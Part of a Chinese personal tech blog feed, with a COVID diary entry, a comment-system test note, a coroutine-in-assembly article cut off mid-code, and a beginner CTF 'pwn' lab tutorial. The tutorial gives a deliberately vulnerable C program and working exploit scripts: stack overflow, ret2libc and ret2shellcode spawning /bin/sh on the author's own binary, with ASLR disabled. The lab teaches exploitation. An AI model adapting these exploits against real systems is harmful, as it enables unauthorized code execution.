还是清晰的两条杠。\n今天，12/24，咳嗽症状还在。另外不知道是不是新冠确实削弱了免疫系统，在发热症状消退后两天就出现了严重的牙龈炎，持续到现在还肿着，伴随偶尔来一下的神经痛，十分刺激。\n以上。\n另外还有点别的想说。\n今年11月因为广州疫情爆发，居家办公了一个月，放开后上班不到两天，又先后全家阳性，11~12两个月几乎没怎么好好上班。以至于前段时间听说本部门老大离职了，我居然成了最后一个知道的。\n心里五味杂陈，真的是难以言喻。转正前那段时间本来不想留的，还是被他劝下来的。结果才个月就立场互换。同期两个试用期同事都没留，入职前联系的HR在我入职后就跑了。\n难顶。\n说起来还有点惭愧，本来居家办公还少了2小时/天的通勤时间，不管是写博客、看书还是培养点兴趣爱好都是好的，但果然还是和以往一样，多出来的时间没有得到有效利用。说起来上家也是真的待遇挺好的，但凡项目管理上要是有现在这家的80%的功夫，也不至于几年都出不了一个那么简单的产品，今后估计想找到这样一家公司难了。\n不说工作的屁事了。\n双11买了几本书，惯例买重了一本（我都为自己这脑子悲哀），不久前才送到。\n 《深入理解Linux网络技术内幕》x2 《CSAPP》 《深入理解Linux内核》 《计算机网络-自顶向下方法》 《Rust系统编程》 《CTF竞赛权威指南-PWN》 一整套《鲁迅全集》二十本。  按惯例还是没开始看，拿来压书架了。\n工作里发现《TCP/IP 协议详解：卷一》这本有点实用到意外，必须找时间看了。\n最后，在看《孤独摇滚》，芳文社 yyds ！电吉他已下单，燥起来！把东京塔烧成灰（精神错乱）！\n","date":"2022-12-24T14:36:31+08:00","image":"https://nnnewb.github.io/blog/p/%E7%BE%8A%E4%BA%86/cover_hub369136724894891ad018e968112bc7b_73106_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://nnnewb.github.io/blog/p/%E7%BE%8A%E4%BA%86/","title":"羊了"},{"content":"概述 当前测试的是 comment management system v0.1 简称 cms 。代码暂未开源。\n前后端分离架构，前端采用 vue3 + dayjs 没别的库。后端 gin + gorm，ddd 方式设计，RESTful API。\n功能 评论和回复 类贴吧风格但没有账号所以也没有显示回复对象是谁。\n表情回应 仿 github 的 reaction 功能。本来想设计成赞和踩但想想表情回应其实更灵活一些。\n因为匿名回应的缘故也没限制回应频率，想统计肯定是不准确的。就当娱乐吧。\n头像 直接用 gravatar 功能。邮箱栏填写注册过 gravatar 的邮箱就能显示了。\n安全 没有做什么保护。\n怀疑过了一遍反代 CORS 配置可能有问题导致被盗用。xss 和 SQL 注入存在的可能性不大，没有使用不安全的 SQL 拼接或者赋值 innerHTML 什么的。如果存在的话可能是我误用了 vue 或 gorm 的某些函数。\n暂时先这样。\n总结 别压测，别的可以随意点玩。\n","date":"2022-08-22T17:50:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%B5%8B%E8%AF%95-2022%E5%B9%B48%E6%9C%8822%E6%97%A5/","title":"评论系统测试 2022年8月22日"},{"content":"前言 经过很长一段时间的学习（理解为浪费时间即可），终于能简单过个 pwn 的 demo 了。于是水一篇博客记录一下。\n准备 建立一个 pwn 文件夹做工作区，初始化一个 python 环境，装好 pwntools ，虽然还不怎么用得到。题目来源是 ctf101 binary-exploitation buffer-overflow，源码略做修改。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; int main(void) { volatile int secret = 0x12345678; char buffer[100] = \u0026#34;\u0026#34;; printf(\u0026#34;buffer: %p, secret: %p\\n\u0026#34;, buffer, \u0026amp;secret); read(STDIN_FILENO, buffer, 0x100); // ! dangerous !  if (secret == 0x1234) { puts(\u0026#34;cool!\u0026#34;); } else { puts(\u0026#34;that\u0026#39;s not cool enough.\u0026#34;); } return 0; }   漏洞行已经标注出。题意比较清楚，通过 read(0,buffer,0x100) 溢出覆写 secret，来通过后续的检查。volatile是为了避免被优化成寄存器变量，不过指定 -O0 的时候加不加volatile都无所谓。\n简单写个 Makefile 编译出 32 和 64 位两个版本，之后也会写两个 exp 。\n1 2 3 4 5 6 7 8  all: question32 question64 question32: question.c gcc $^ -m32 -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question32 question64: question.c gcc $^ -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question64   比较重要的是 -fno-stack-protector，不加的话会在溢出 buffer 的时候触发 stack canary 检测，直接报 stack smashing detected 后退出。不过 32 位似乎没这个问题。\n再创建 exploit32.py和exploit64.py两个文件用来保存我们的exploit脚本，准备工作就算结束了。\n缓冲区溢出 原理 引用自 ired.team binary exploitation ：\n At a high level, exploiting a buffer overflow boils down to the following key points:\n Attacker overflows vulnerable program\u0026rsquo;s memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening; When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker; Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program\u0026rsquo;s memory, when the program\u0026rsquo;s memory buffer was overflowed; The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.   简而言之，就是通过覆写内存，操纵程序的控制流，运行攻击者的恶意代码或窃取数据。\n32位栈上缓冲区溢出 分析案例代码，buffer和secret是栈上相邻的变量，从声明顺序盲猜secret在更接近栈底的位置（高地址），buffer在更接近栈顶的位置（低地址）。x86体系结构下栈从高地址向低地址增长，\u0026amp;buffer[0]是栈顶，则\u0026amp;buffer[100]就是secret的地址了。\nread(STDIN_FILENO, buffer, 0x100) 从标准输入读取 0x100 个字节，从 \u0026amp;buffer[0] 开始写入。因为边界检查失效（写入长度0x100大于buffer[100]长度），只要我们提供 104 个字节的输入，最后四个字节就会覆盖 secret 变量的值。\n为了验证上面的说法，可以先创建一个 payload 文件作为 question32 的输入。\n1  open(\u0026#39;payload32.bin\u0026#39;,\u0026#39;wb+\u0026#39;).write(b\u0026#39;\\x41\u0026#39;*104)   接下来使用 gdb 观察读取输入前后的栈数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  Reading symbols from question32... (gdb) b question.c:8 Breakpoint 1 at 0x1214: file question.c, line 8. (gdb) b question.c:9 Breakpoint 2 at 0x122a: file question.c, line 9. (gdb) r \u0026lt; payload32.bin Starting program: /home/weakptr/repos/pwn/lab-1/question32 \u0026lt; payload32.bin [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. buffer: 0xffffd058, secret: 0xffffd0bc Breakpoint 1, main () at question.c:8 8 read(STDIN_FILENO, buffer, 0x100); (gdb) x/32x $esp 0xffffd050: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd060: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd070: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd080: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd090: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd0a0: 0x00000000 0x00000000 0x00000000 0x00000000 0xffffd0b0: 0x00000000 0x00000000 0x00000000 *0x12345678* 0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0 (gdb)   观察第 21 行，0xffffd0bc 处，0x12345678，就是 question.c 中初始化的 secret 了。而从 0xffffd0508到0xffffd0bc就是buffer的内容。\n我们继续执行到 read 这一行后。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  (gdb) next Breakpoint 2, main () at question.c:9 9 if (secret == 0x1234) { (gdb) x/32x $esp 0xffffd050: 0x00000000 0x00000000 0x41414141 0x41414141 0xffffd060: 0x41414141 0x41414141 0x41414141 0x41414141 0xffffd070: 0x41414141 0x41414141 0x41414141 0x41414141 0xffffd080: 0x41414141 0x41414141 0x41414141 0x41414141 0xffffd090: 0x41414141 0x41414141 0x41414141 0x41414141 0xffffd0a0: 0x41414141 0x41414141 0x41414141 0x41414141 0xffffd0b0: 0x41414141 0x41414141 0x41414141 *0x41414141* 0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0 (gdb) p /x secret $2 = 0x41414141   观察到 secret 被覆盖为 0x41414141。\n现在只需要把 payload32.bin 中最后四个字节改成预期的 secret 值 0x1234 即可。\n1 2 3 4 5 6 7 8  import pwn import struct proc = pwn.process(\u0026#39;./question32\u0026#39;) b = struct.pack(\u0026#39;@l\u0026#39;, 0x1234) proc.sendline(b\u0026#39;\\x41\u0026#39;*100 + b) print(proc.recv().decode())   结果：\n1 2 3 4 5 6  (.venv) vm :: repos/pwn/lab-1 » python exploit32.py [+] Starting local process \u0026#39;./question32\u0026#39;: pid 640653 [*] Process \u0026#39;./question32\u0026#39; stopped with exit code 0 (pid 640653) buffer: 0xffc0bf88, secret: 0xffc0bfec cool!   64位栈上缓冲区溢出 x86-64架构下的栈上缓冲区溢出和 32 位架构有所不同，主要区别在于 64位 ELF 多了很多保护机制，直接影响栈上缓冲区溢出的就有 stack canary。\nstack canary 关于 stack canary 机制的解释摘录如下。\n Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.\n 尝试让 gcc 吐出带 canary 的汇编如下，命令 gcc -S question.c -g -O0 -fstack-protector -o question64.s\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  main: endbr64 pushq\t%rbp movq\t%rsp, %rbp addq\t$-128, %rsp movq\t%fs:40, %rax movq\t%rax, -8(%rbp) xorl\t%eax, %eax movl\t$305419896, -116(%rbp) movq\t$0, -112(%rbp) movq\t$0, -104(%rbp) movq\t$0, -96(%rbp) movq\t$0, -88(%rbp) // 略 movl\t$0, %eax movq\t-8(%rbp), %rdx subq\t%fs:40, %rdx je\t.L5 call\t__stack_chk_fail@PLT .L5: leave ret   在函数序言部分多出了几条指令：\n1 2 3  movq\t%fs:40, %rax movq\t%rax, -8(%rbp) xorl\t%eax, %eax   而末尾返回之前多了一条判断：\n1 2 3 4 5 6 7 8  movl\t$0, %eax movq\t-8(%rbp), %rdx subq\t%fs:40, %rdx je\t.L5 call\t__stack_chk_fail@PLT .L5: leave ret   明显能看出，%fs:40 就是上文引用中所谓的 a secret value placed on the stack which changes every time the program is started 。\n栈对齐 在64位系统上，栈默认会对齐到 16 字节（也许看编译器默认参数，在我的实验环境中是这样的）。例如案例中 question.c 的 secret 我们可以看做 4 字节大小（具体大小和你的系统、CPU、编译器都有关系），也就是 buffer 加上 secret 一共 104 个字节，除 16 得 6.5 显然是没对齐的。编译器会自动分配对齐到 16 字节的栈大小：112 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  main: pushq\t%rbp movq\t%rsp, %rbp subq\t$112, %rsp # align to 16 bytes movl\t$305419896, -4(%rbp) movq\t$0, -112(%rbp) movq\t$0, -104(%rbp) movq\t$0, -96(%rbp) movq\t$0, -88(%rbp) movq\t$0, -80(%rbp) movq\t$0, -72(%rbp) movq\t$0, -64(%rbp) movq\t$0, -56(%rbp) movq\t$0, -48(%rbp) movq\t$0, -40(%rbp) movq\t$0, -32(%rbp) movq\t$0, -24(%rbp) movl\t$0, -16(%rbp) leaq\t-4(%rbp), %rdx # %rdx =\u0026gt; secret leaq\t-112(%rbp), %rax # %rax =\u0026gt; buffer   简单计算可得 -4(%rbp) ~ (%rbp) 是 secret，-12(%rbp) ~ -4(%rbp) 是为了对齐而填充的大小。\n如果我们想溢出覆盖 secret 的值，则需要填充 100 字节的 buffer + 8 字节的对齐 + 4 字节 secret 值，一共 112 字节的 payload。\n1 2 3 4 5 6 7 8 9  import pwn import struct proc = pwn.process(\u0026#39;./question64\u0026#39;) b = struct.pack(\u0026#39;@q\u0026#39;, 0x1234) print(b) proc.sendline(b\u0026#39;\\x41\u0026#39;*100 + b\u0026#39;\\x00\u0026#39; * 8 + b) print(proc.recv().decode())   结果：\n1 2 3 4 5 6  (.venv) vm :: repos/pwn/lab-1 » python exploit64.py [+] Starting local process \u0026#39;./question64\u0026#39;: pid 10128 b\u0026#39;4\\x12\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; [*] Process \u0026#39;./question64\u0026#39; stopped with exit code 0 (pid 10128) buffer: 0x7ffc03d29950, secret: 0x7ffc03d299bc cool!   ROP 基础 有趣的部分真正开始。ROP 全称是 Return Oriented Programming，一种通过返回指令串联代码片段，以执行复杂逻辑的技术思想。参考文章：ctf wiki - 基本ROP。\n原理 从简单的开始说起。call指令的本质是压栈IP寄存器接一个无条件跳转指令。而ret指令本质是从栈上弹出一个地址，然后无条件跳转。\n那么能用ret替代call指令吗？把ret当成jmp来用，当然没什么不能的（考虑 x86/cdecl 调用约定）。\nret 指令执行后，栈上布局就会变成：\n和正常函数调用如出一辙。\nASLR 想要实现自由控制跳转地址和参数的目的，还有一个拦路虎叫 ASLR 不作更多解释。通过 sysctl 或编辑 /proc/sys/kernel/randomize_va_space 控制。\n1 2 3 4 5 6 7  .PHONY: disable-aslr disable-aslr: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space .PHONY: enable-aslr enable-aslr: echo 1 | sudo tee /proc/sys/kernel/randomize_va_space   之后可以多次运行 question32 ，观察输出来确认栈地址是否变化。\nret2libc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // gcc question.c -m32 -fno-stack-protector -no-pie -g -O0 -o question32 #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; char name[100] = \u0026#34;\u0026#34;; int main(void) { char buffer[100] = \u0026#34;\u0026#34;; printf(\u0026#34;name: %p buffer: %p\\n\u0026#34;, name, buffer); printf(\u0026#34;what\u0026#39;s your name?\\n\u0026#34;); read(STDIN_FILENO, name, sizeof(name) - 1); printf(\u0026#34;Welcome, %s. Show your hack skill.\\n\u0026#34;, name); read(STDIN_FILENO, buffer, 0x100); return 0; }   简单写一个脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import pwn from pwn import gdb, process import struct def p32s(*i): return struct.pack(\u0026#34;\u0026lt;\u0026#34;+\u0026#34;I\u0026#34;*len(i), *i) p = gdb.debug(\u0026#39;./question32\u0026#39;, \u0026#39;\u0026#39;\u0026#39; b question.c:13 continue \u0026#39;\u0026#39;\u0026#39;) p.interactive()   观察程序的 epilogue 部分，main() 在 prologue 部分保存了 %ecx、%edi、%ebx 寄存器的值，在清栈阶段会恢复这些寄存器。\n1 2 3 4 5 6 7  leal\t-12(%ebp), %esp popl\t%ecx popl\t%ebx popl\t%edi popl\t%ebp leal\t-4(%ecx), %esp ret   需要注意的是 %ecx 寄存器的值会被用作 %esp ，而我们覆写返回地址必然导致 %ecx 寄存器的值被覆写，所以需要提前算好 leal -4(%ecx), %esp 指令执行后 %esp 指向的位置，让 %esp 刚好指向我们期望的 system 函数地址。\n脚本启动 gdb 后先计算下 \u0026amp;buffer 到 movl -12(%ebp), %esp 这条指令后的 %esp 的距离，也就是从buffer一路写到栈上保存的 %ecx 前所需填充的长度。\n1 2 3 4 5  gdb-peda$ p \u0026amp;buffer $1 = (char (*)[100]) 0xffffd0dc gdb-peda$ distance 0xffffd0dc From 0xffffd14c (SP) to 0xffffd0dc: -112 bytes, -28 dwords gdb-peda$   得到长度后简单计算下 \u0026amp;buffer(0xffffd0dc) + padding_size(112) + register(4) * 4 等于 0xffffd1bc，这个地址就是我们溢出后覆写的返回地址所在位置，这个地址加上 4 就是 %ecx 的取值了。\n最后获取 system 函数的地址和 name 的地址，作为 system 函数的返回地址我们再获取一下 exit 函数的地址。\n1 2 3 4 5 6 7  gdb-peda$ p \u0026amp;system $1 = (\u0026lt;text variable, no debug info\u0026gt; *) 0xf7dcbcb0 \u0026lt;system\u0026gt; gdb-peda$ p \u0026amp;name $2 = (char (*)[100]) 0x804c060 \u0026lt;name\u0026gt; gdb-peda$ p \u0026amp;exit $3 = (\u0026lt;text variable, no debug info\u0026gt; *) 0xf7dbe1c0 \u0026lt;exit\u0026gt; gdb-peda$   综合这些元素组装一个 payload 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  from pwn import gdb import struct p = gdb.debug(\u0026#39;./question32\u0026#39;, \u0026#39;\u0026#39;\u0026#39; b question.c:13 continue \u0026#39;\u0026#39;\u0026#39;) p.send(b\u0026#39;/bin/sh\u0026#39;) payload = b\u0026#39;\\x42\u0026#39; * 112 # %ecx, %ebx, %edi, %ebp, \u0026amp;system, \u0026amp;exit, \u0026amp;name stack_elem = [0xffffd1c0, 0, 0, 0, 0xf7dcbcb0, 0xf7dbe1c0, 0x804c060] payload += struct.pack(\u0026#39;\u0026lt;IIIIIII\u0026#39;, *stack_elem) p.send(payload) p.interactive()   启动调试，注意到执行到 ret 时，%esp 已经是 system 的地址，并预先填充了 exit 函数地址作为 system 函数的返回地址，\u0026quot;/bin/sh\u0026quot; 字符串的指针作为 system 函数的参数。\n继续执行。\n成功取得shell。现在我们把调试器去除，使用 pwn.process 来启动程序。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  from pwn import process import struct p = process(\u0026#39;./question32\u0026#39;) p.send(b\u0026#39;/bin/sh\u0026#39;) payload = b\u0026#39;\\x42\u0026#39; * 112 # %ecx, %ebx, %edi, %ebp, \u0026amp;system, \u0026amp;perror, \u0026amp;name stack_elem = [0xffffd1c0, 0, 0, 0, 0xf7dcbcb0, 0xf7dbe1c0, 0x804c060] payload += struct.pack(\u0026#39;\u0026lt;IIIIIII\u0026#39;, *stack_elem) p.send(payload) p.interactive()   结果：\n1 2 3 4 5 6 7 8 9  (.venv) vm :: repos/pwn/lab-2 » python exp32.py [+] Starting local process \u0026#39;./question32\u0026#39;: pid 146484 [*] Switching to interactive mode name: 0x804c060 buffer: 0xffffd13c what\u0026#39;s your name? Welcome, /bin/sh. Show your hack skill. $ echo $0 /bin/sh $   成功。\nret2shellcode 这是另一个例子，不同之处在于栈可执行保护没有开启（编译参数 -z execstack）。其他和上例相同。\npwntools 提供了一些 shellcode 片段，其中就有用系统调用 execve 启动 /bin/sh 的代码。在 ret2libc 的 exploit 基础上，我们只用把返回地址修改成 buffer 的地址，把填充 buffer 的 \\x41 换成 shellcode 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  from pwn import gdb, shellcraft, asm import struct p = gdb.debug(\u0026#39;./question32\u0026#39;, \u0026#39;\u0026#39;\u0026#39; b question.c:13 continue \u0026#39;\u0026#39;\u0026#39;) p.send(\u0026#39;hacker\u0026#39;) print(p.recv().decode()) payload = asm(shellcraft.i386.linux.sh()) payload += b\u0026#39;\\x00\u0026#39; * (112-len(payload)) # %ecx, %ebx, %edi, %ebp, \u0026amp;buffer stack_elem = [0xffffd1c0, 0, 0, 0, 0xffffd13c] payload += struct.pack(\u0026#39;\u0026lt;IIIII\u0026#39;, *stack_elem) p.send(payload) p.interactive()   在调试器中观察，确认ret跳转到了\u0026amp;buffer，将脚本改为 pwn.process 即可。\n还可以看下 shellcraft.i386.linux.sh 提供的代码片段长什么样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  /* execve(path=\u0026#39;/bin///sh\u0026#39;, argv=[\u0026#39;sh\u0026#39;], envp=0) */ /* push b\u0026#39;/bin///sh\\x00\u0026#39; */ push 0x68 push 0x732f2f2f push 0x6e69622f mov ebx, esp /* push argument array [\u0026#39;sh\\x00\u0026#39;] */ /* push \u0026#39;sh\\x00\\x00\u0026#39; */ push 0x1010101 xor dword ptr [esp], 0x1016972 xor ecx, ecx push ecx /* null terminate */ push 4 pop ecx add ecx, esp push ecx /* \u0026#39;sh\\x00\u0026#39; */ mov ecx, esp xor edx, edx /* call execve() */ push SYS_execve /* 0xb */ pop eax int 0x80   乍一看有点奇怪，但注意观察汇编后的机器码就会发现这段汇编编译后不包含 \\x00，在 strcpy 之类的场景下能避免被截断，泛用性更好。\n总结 存在几个问题。\n 很多保护机制绕过方法没有学。ASLR、PIE、NX、CANARY 等。 花了很长时间去无谓地算偏移，明明给了 andl -16, %esp 却不肯看一眼对齐前后 %esp 怎么变。 gdb 不熟练，gdb-peda 真的很好用，绝了。 还没试过构造 ROP Gadget 链  各方面都有很大提高空间吧。想找个群什么的有问题不用自己强钻牛角尖。\n","date":"2022-08-18T17:52:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/","title":"入门pwn"},{"content":"前言 尝试阅读分析云风大佬的 cloudwu/coroutine ，学习协程的基本原理和实现，然后自己写一个。\n原理 协程是协同运行的程序，不同语言的实现可以有很大差异。但从基本的来说，协程应该是要低于线程一级的，在用户态调度的程序。\n既然是用户态调度，也就意味着开两个线程然后用信号量或互斥锁同步就不叫协程，因为线程都是内核调度和切换上下文的。\n所以实现协程，实现的就是程序的上下文切换和调度分配，代码实现也关注这一块。\n协同式协程 不确定有没有专有名词描述这种调度方式。\n“协同式”，指的是需要协程主动放弃执行，调度器才切换调度其他协程运行的情况。协同式调度，协程可以自由决定什么时候交还控制权。\n云风大佬的 coroutine 库就是协同式调度。\n抢占式协程 如 go 的 goroutine 就是，不需要协程主动放弃执行，调度器会主动在合适的时候停止协程，或创建新的线程，来调度协程运行。\n上下文切换 上下文切换，上下文指的是程序运行的状态。具体点说，包括：\n 寄存器（通用寄存器和浮点寄存器） 栈  以及一些其他的内容，比如监听/屏蔽的 UNIX 信号等，按平台可能有所区别。\n在 Linux 上，GNU C Lib 提供了 ucontext.h 头文件暴露相关内核接口。而在 Windows 上，微软也也提供了 fibers 抽象。\n调度 以协作式调度为例，只需要简单地在需要让出CPU时，主动保存自己的执行状态，恢复调度器的上下文，然后跳转到调度器继续执行即可。而恢复协程执行也是同理，将执行状态恢复后跳转回上一个中断点即可。\n抢占式调度则更复杂一些，因为被调度的协程可能处于不能打断的状态或频繁打断产生性能上的负面影响。调度器需要综合多种因素，选择合适的时机打断和切换上下文。\n实现 学习为主，云风的 coroutine 直接用了 ucontext，但我对 ucontext 实现的方式更好奇，所以选择自己用汇编实现上下文的保存和恢复。\n由于是自己瞎造轮子，难免会有各种错误和潜在问题，但就这样吧。\n初步设计 构想中的协程应该有自己的独立栈区，而调度器继续停留在系统栈。\n调度器通过 resume 切换上下文到协程，协程通过 yield 切换上下文到调度器。当 resume 时，应该从协程上一次调用 yield 的地方（或函数入口）开始执行。而调用 yield 的时候，应该回到调度器上一次调用 resume 进入协程上下文的地方继续执行。\n当所有协程都结束后，调度器正常返回。\n实现思路 实现协程最大的难点就在如何切换上下文，我考虑的方法是通过修改 bp 和 sp 寄存器劫持返回地址，让yield和resume返回到对方的位置，来实现上下文切换。\n协程和调度器结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  struct wo_routine { uint64_t registers[17]; // 寄存器状态  uint8_t *stack; // 协程专属栈  wo_fp func; // 协程入口点  void *args; // 参数指针，存放到 RDI 寄存器  wo_state state; // 协程状态  struct wo_routine *next; // 协程队列，环形链表  struct wo_routine *prev; // 协程队列，环形链表 }; struct wo_scheduler { uint64_t registers[17]; // 调取协程的寄存器状态  struct wo_routine *C; // 当前正在运行的协程 }; // 调度器实例指针，每个线程独享一个 extern _Thread_local struct wo_scheduler *S;   基于上面的思路，设计出基本的协程结构。包含寄存器、栈、函数入口和参数。为了让多个协程可以轮流执行，将协程结构设计成一个环形链表，以允许随时插入新的协程，在当前协程后被调度执行。\n协程本身也存在状态，不同状态的协程进入调度时会有不同的处理。\nAPI设计 依照上面的思路，可以比较简单地列出需要的接口：\n wo_main，主函数，必要的初始化和启动调度器，开始运行协程。 wo_start，在工作队列里添加一个协程，可以在 wo_main 之前或协程中调用。 wo_yield，只能在协程里调用，切换上下文到调度器。 wo_resume，只能在调度器里调用，切换上下文到协程。  就是这些。\n调度器部分实现 调度器主要工作是管理工作队列（协程组成的环形链表），添加协程或移除已结束的协程，在没有可调度协程时退出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  void wo_schedule(void) { if (S-\u0026gt;C == NULL) { return; } for (;;) { if (S-\u0026gt;C == NULL) { break; } wo_resume(); switch (S-\u0026gt;C-\u0026gt;state) { case WO_STATE_EXITED: // 从工作队列删除自己  if (S-\u0026gt;C != S-\u0026gt;C-\u0026gt;next \u0026amp;\u0026amp; S-\u0026gt;C-\u0026gt;next != NULL) { S-\u0026gt;C-\u0026gt;next-\u0026gt;prev = S-\u0026gt;C-\u0026gt;prev; S-\u0026gt;C-\u0026gt;prev-\u0026gt;next = S-\u0026gt;C-\u0026gt;next; S-\u0026gt;C = S-\u0026gt;C-\u0026gt;next; break; } else { return; } case WO_STATE_SUSPENDED: if (S-\u0026gt;C != S-\u0026gt;C-\u0026gt;next \u0026amp;\u0026amp; S-\u0026gt;C-\u0026gt;next != NULL) { S-\u0026gt;C = S-\u0026gt;C-\u0026gt;next; } break; default: assert(false); return; } } }   调度器主循环。\n按设计协程 yield 或 return 后都是从 resume 返回。所以在resume 后 switch 检查协程的状态。如果协程是 yield 则状态为 SUSPENDED，调度器取下一个协程继续运行。若协程为 return 返回，结束运行，则进入 EXIT 状态，调度器从工作队列里删除协程。其他情况都是不应该出现的。\n添加协程的 start 函数如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  void wo_start(wo_fp func, void *args) { if (S == NULL) { S = (wo_sp)calloc(1, sizeof(wo_s)); } wo_rp routine = (wo_rp)calloc(1, sizeof(wo_r)); routine-\u0026gt;stack = (uint8_t *)malloc(STACK_SIZE); memset(routine-\u0026gt;stack, 0, STACK_SIZE); routine-\u0026gt;func = func; routine-\u0026gt;args = args; if (S-\u0026gt;C == NULL) { S-\u0026gt;C = routine; return; } // 把自己插入队列  if (S-\u0026gt;C-\u0026gt;next != NULL) { routine-\u0026gt;next = S-\u0026gt;C-\u0026gt;next; S-\u0026gt;C-\u0026gt;next-\u0026gt;prev = routine; } else { routine-\u0026gt;next = S-\u0026gt;C; S-\u0026gt;C-\u0026gt;prev = routine; } routine-\u0026gt;prev = S-\u0026gt;C; S-\u0026gt;C-\u0026gt;next = routine; }   主要工作就是构造出 wo_routine 结构，初始化栈，然后加入工作队列，等待调度。\nresume resume 负责保存上下文并切换到协程。切换到协程又分两种情况：\n 协程处于 READY 状态，也就是还没开始执行，此时协程的寄存器、栈都是空的。 协程处于 SUSPENDED 状态，也就是协程已经执行过，寄存器和栈保存的是协程 yield 时储存的状态。  当协程处于 READY 状态时是没法恢复上下文的，因为根本就不存在 上一次执行时的上下文 。READY 状态时 resume 做的并不是 恢复 上下文，而是 构造 一个合适的初始状态，让协程从这个初始状态开始执行。\n在实现思路中提到过我想要控制 sp 寄存器，劫持返回地址来实现切换上下文，这里展开说一说具体怎么做。讨论限定在 Linux x86-64 GCC 编译器环境下。\n还是从READY状态的协程开始说。\n启动新协程 新协程的启动主要考虑两个问题：\n 如何让新协程用自己的栈和寄存器。 如何让新协程开始执行。 如何让新协程结束时返回到 resume 。避免在协程代码里调一次 exit 之类的函数，协程代码编写更自然。  对问题1，让新协程用自己的栈和寄存器可以很简单，保存主线程的寄存器状态，然后将rsp寄存器设置为协程栈的栈底即可。至于新协程的寄存器状态，我们需要关注的只有 rdi、rsi 这些 x86-64 基于寄存器的调用约定里，规定用于传递参数的寄存器即可。出于简化考虑，我们只在start中允许一个初始参数，所以设置好 rdi 寄存器的值即可。除rsp、rdi外，应该无需再设置其他寄存器的值。\n对问题2和3，我的方法是正常调用协程函数。call指令会在协程栈上压栈返回地址，协程函数的序言部分会压栈rbp，然后把rbp设置成rsp，我们不需要关注旧的rbp值，在协程中不会再用到。\n协程正常执行结束后，在返回时，会弹出rbp并返回到调用者，也就是 resume 中调用协程函数的地方。此时必须注意 resume 运行在协程栈上，而且rsp已经是栈底。如果在调用协程函数后直接return，会导致rsp越界读到无效的rbp和返回地址，让协程跑飞。在协程函数返回后，resume 里需要标记协程状态为结束，并手动做一次上下文切换，返回到调度器函数。\n恢复旧协程 对旧协程的恢复较为简单，因为rsp寄存器已经在 yield 中保存，恢复寄存器后栈状态其实和 yield 中相同。此时只要保证 resume 和 yield 函数的清栈操作相同（栈帧大小相同），清栈后 rsp 都能落在返回地址上，则 resume 的 return 实际等于 yield 中 return 。在 resume 的 return 执行后，就会返回到协程调用 yield 的位置。\n实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  void wo_exit(void) { S-\u0026gt;C-\u0026gt;state = WO_STATE_EXITED; // 协程已结束。不保存上下文。  // 恢复调度器上下文  // 调度器独享系统栈所以不用复制栈，仅恢复寄存器状态  __asm__(\u0026#34;movq %0, %%rbx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RBX])); __asm__(\u0026#34;movq %0, %%rcx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RCX])); __asm__(\u0026#34;movq %0, %%rdx\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RDX])); __asm__(\u0026#34;movq %0, %%rsi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RSI])); __asm__(\u0026#34;movq %0, %%rdi\u0026#34; ::\u0026#34;a\u0026#34;(S-\u0026gt;registers[REG_RDI])); __asm__(\u0026#34;movq %0, %%rsp\u0026#34; 